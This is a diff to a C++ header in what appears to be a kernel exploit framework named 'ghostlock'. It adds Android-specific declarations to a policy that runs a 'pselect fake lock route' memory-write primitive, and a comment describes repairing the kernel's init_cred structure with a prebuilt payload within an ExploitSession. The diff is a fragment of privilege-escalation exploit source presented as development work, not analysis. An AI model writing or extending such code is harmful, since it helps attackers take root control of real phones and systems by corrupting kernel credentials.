@@ -76,6 +76,9 @@ namespace ghostlock::route {
 
     struct SelectPolicy : RoutePolicyDefaults {
         static constexpr RouteKind kind = RouteKind::SelectStack;
+#if defined(__ANDROID__)
+        static constexpr bool w2_fast_repair = true;
+#endif
 
         static bool supported(const profile::TargetProfile &profile) noexcept {
             return profile.supports(kind);
@@ -84,6 +87,17 @@ namespace ghostlock::route {
         static RouteStatus run(const memory::WriteRequest *request) {
             return do_pselect_fake_lock_route(request);
         }
+
+#if defined(__ANDROID__)
+        /* Same W2b repair contract as MulticastPolicy: the compact waiter also
+         * writes target+8, so init_cred+8 is repaired with a prebuilt payload
+         * before the child is released. */
+        [[gnu::noinline]] static bool w2_fast_repair_prebuild(
+            session::ExploitSession &exploit_session) noexcept;
+
+        [[gnu::noinline]] static bool w2_fast_repair_activate(
+            session::ExploitSession &exploit_session) noexcept;
+#endif
     };
 
     struct TcpPolicy : RoutePolicyDefaults {
